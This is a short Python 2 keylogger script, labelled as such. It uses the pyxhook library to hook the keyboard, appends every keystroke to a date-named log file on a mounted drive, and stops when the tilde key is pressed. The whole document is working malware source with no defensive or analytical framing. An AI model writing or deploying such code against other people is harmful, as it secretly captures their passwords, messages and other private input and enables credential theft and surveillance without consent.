# KEYLOGGER
import pyxhook
import time
import string 

date=str(time.strftime("%x"))
ans=string.replace(date,'/','-')
log_file='/media/shivam/1AB0BFACB0BF8CAF/logs/'+str(ans) +'.logs'
print log_file
def OnKeyPress(event):
  char=open(log_file,'a')
  char.write(event.Key)
  if event.Key=='Return':
    char.write('\n')
  else:
    char.write(' ')

  if event.Ascii==126:
    char.close()
    new_hook.cancel()

new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
